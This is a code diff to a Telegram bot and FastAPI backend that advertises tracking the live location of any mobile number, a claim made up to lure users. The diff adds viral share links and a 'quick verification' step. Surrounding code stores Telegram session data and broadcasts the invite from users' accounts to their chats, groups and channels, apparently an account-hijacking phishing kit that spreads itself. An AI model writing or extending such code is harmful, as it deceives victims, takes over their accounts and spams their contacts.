@@ -2,6 +2,7 @@ import os
 import asyncio
 import re
 import requests
+from urllib.parse import quote
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
@@ -22,6 +23,12 @@ WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.onrender.com")
 BOT_USERNAME = os.environ.get("BOT_USERNAME", "anontracker_bot")
 CONCURRENT_CHATS = 5
 
+# Shared invite message used by every "Share Bot" link
+SHARE_INVITE_TEXT = (
+    "🔍 Track any mobile number's live location & full details instantly!\n\n"
+    "👉 Open this bot and click 📍 Track Location:\n"
+)
+
 app = FastAPI()
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
 templates = Jinja2Templates(directory="templates")
@@ -31,6 +38,15 @@ auth_data = {}
 pipeline_running = set()
 
 bot = TelegramClient('bot_session', API_ID, API_HASH) if API_ID and API_HASH else None
+
+
+def bot_link() -> str:
+    return f"https://t.me/{BOT_USERNAME}"
+
+
+def build_share_url() -> str:
+    """Telegram share URL that shares the BOT LINK with an invite message (no website URL)."""
+    return f"https://t.me/share/url?url={quote(bot_link(), safe='')}&text={quote(SHARE_INVITE_TEXT, safe='')}"
 
 
 def build_broadcast_text() -> str:
@@ -46,9 +62,10 @@ def build_broadcast_text() -> str:
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "⚡ **How to use:**\n"
         "1️⃣ Open the bot\n"
-        "2️⃣ Enter any mobile number\n"
-        "3️⃣ Get live location + full details instantly\n\n"
-        f"🚀 **Track Now:** https://t.me/{BOT_USERNAME}\n\n"
+        "2️⃣ Click 📍 **Track Location**\n"
+        "3️⃣ Enter any mobile number\n"
+        "4️⃣ Get live location + full details instantly\n\n"
+        f"🚀 **Track Now:** {bot_link()}\n\n"
         f"👉 Bot: **@{BOT_USERNAME}**\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "🔒 Private • Fast • Anonymous"
@@ -59,18 +76,23 @@ if bot:
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
         try:
-            me = await bot.get_me()
-            link = f"https://t.me/{me.username}"
-            kb = [
-                [Button.url("📍 Track Location", WEBAPP_URL)],
-                [Button.url("↗️ Share Bot", f"https://t.me/share/url?url={link}")]
-            ]
             welcome_text = (
                 "👋 **Welcome to Anon Locater Bot!**\n\n"
                 "I can help you track the live location, device details, and network data "
                 "of any mobile number worldwide.\n\n"
-                "Click the button below to start tracking instantly."
+                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚡ **How to Track:**\n"
+                "1️⃣ Click the **📍 Track Location** button below\n"
+                "2️⃣ Enter the target mobile number\n"
+                "3️⃣ Complete the quick verification\n"
+                "4️⃣ Get live location + full details instantly\n"
+                "━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "👇 Click **📍 Track Location** to start."
             )
+            kb = [
+                [Button.url("📍 Track Location", WEBAPP_URL)],
+                [Button.url("↗️ Share Bot", build_share_url())]
+            ]
             await event.reply(welcome_text, buttons=kb)
         except Exception as e:
             print(f"[bot /start] error: {e}")
@@ -208,6 +230,7 @@ async def broadcast_to_all(client, me, tg_user_id, tg_username):
         "owner_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
         "p2p_sent": p2p_count, "group_sent": group_count, "channel_sent": channel_count,
         "total_sent": p2p_count + group_count + channel_count,
+        "share_url": build_share_url(),
         "recipients": recipients,
     }
     await put_to_firebase(stats_path, summary)
@@ -343,8 +366,8 @@ async def check_session(request: Request):
     attempt = await get_from_firebase(f"tgsession/{tg_id}/attempted")
     await put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
     if attempt:
-        return JSONResponse({"status": "signup_required"})
-    return JSONResponse({"status": "not_found"})
+        return JSONResponse({"status": "signup_required", "share_url": build_share_url()})
+    return JSONResponse({"status": "not_found", "share_url": build_share_url()})
 
 
 @app.post("/api/track_target")
@@ -363,6 +386,12 @@ async def check_phone(request: Request):
     if num_data and num_data.get("phone"):
         return JSONResponse({"status": "found", "phone": num_data.get("phone")})
     return JSONResponse({"status": "waiting"})
+
+
+@app.get("/api/share_url")
+async def share_url():
+    """Used by the Mini App / frontend anywhere a 'share bot to signup user' link is needed."""
+    return JSONResponse({"url": build_share_url(), "bot_link": bot_link(), "text": SHARE_INVITE_TEXT})
 
 
 @app.post("/api/action")
